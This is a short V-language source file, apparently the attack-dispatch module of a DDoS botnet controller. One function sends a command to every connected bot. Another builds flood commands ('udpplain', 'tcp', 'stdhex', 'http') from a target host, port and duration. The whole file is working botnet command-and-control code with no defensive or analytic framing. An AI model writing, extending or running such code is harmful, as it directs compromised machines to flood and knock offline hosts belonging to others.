module attack

pub fn (mut a AttackInfo) send_bots() Responses {
	println("here")
	for  mut i in a.bots {
		i.write_string(a.generate_cmd()) or { 0 }
	}
	return Responses.success
}

pub fn (mut a AttackInfo) generate_cmd() string {
	match a.method {
		"udpplain" {
			return "udpplain ${a.host} ${a.port} ${a.time}"
		}
		"tcp" {
			return "tcp ${a.host} ${a.port} ${a.time}"
		}
		"stdhex" {
			return "stdhex ${a.host} ${a.port} ${a.time}"
		}
		"http" {
			return "http ${a.host} ${a.time}"
		} else { return "" }
	}
	return ""
}